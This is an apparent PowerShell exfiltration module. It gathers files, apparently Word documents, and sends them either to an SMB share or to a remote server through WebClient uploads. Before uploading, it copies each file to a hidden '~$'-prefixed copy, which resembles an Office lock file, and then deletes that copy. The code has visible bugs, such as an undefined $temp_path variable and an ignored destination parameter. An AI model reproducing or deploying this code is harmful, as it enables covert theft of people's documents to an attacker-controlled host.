
function Get-Fixed-Path{
    param (
        [string]$path
    )
    $temp_path = $path -replace "\\", "-"
    $temp_path = $temp_path -replace " ", "_"
    $temp_path = $temp_path -replace ":", ""
    return $temp_path
}
function Send-Over-Smb {
    param (
        [string[]]$Paths =@(),
        [string]$Destination
    )
    if(Test-Path $Destination -PathType Container){
        Foreach ($path in $Paths){
            if (Test-Path -Path $path){
                $dest_path = Get-Fixed-Path -path $path
                $dest_path = $Destination + $temp_path
                Copy-Item -Path $path -Destination $dest_path
            }
        }
    }
    else {
        Send-Log -LogString "No access to folder"
    }
}

function Send-Over-Tcp {
    param (
        [string[]]$Paths =@(),
        [string]$Destination
    )
    
    if ($Paths){
        $wc = New-Object System.Net.WebClient
        Send-Log -LogString "Sending To remote server"
        Foreach ($path in $Paths){
            if (Test-Path -Path $path){
                try {
                    $FolderPath = Split-Path -Path $path
                    $TrueFileName = Split-Path -Path $path -Leaf
                    $HiddenDestPath = $FolderPath + "\~$" + $TrueFileName
                    Copy-Item -Path $path -Destination $HiddenDestPath
                    (get-item $HiddenDestPath).Attributes += 'Hidden'
                    $FileContent = [System.IO.File]::ReadAllBytes($HiddenDestPath)
                    (get-item $HiddenDestPath -force).Attributes -= 'Hidden'
                    Remove-Item $HiddenDestPath
                    
                }
                catch {
                    Send-Log -LogString "Failed while trying to read temp file"
                }

                try {
                    $dest_path = Get-Fixed-Path -path $path
                    $uri = $Remote + "?filename=" + $dest_path
                    Send-Log -LogString "Sending File $path, $uri"
                    $wc.UploadDataAsync($uri, $FileContent)
                }
                catch {
                    Send-Log -LogString "Error sending to dest server"
                }
            }
            
        }
    }
}

function Send-Data{
    param (
        [string]$Protocol = $CommunicationMethod,
        [string[]]$Paths =@(),
        [string]$Destination = $Remote
    )
    switch ($Protocol) {
        smb {
             Send-Over-Smb -Paths $Paths -Destination $Destination
        }
        remote{
    
            Send-Over-Tcp -Paths $Paths -Destination $Destination
        }
        Default {
            Send-Log -LogString "Seems like your Sender flag is wrong... cant send word files"
        }
    }
}
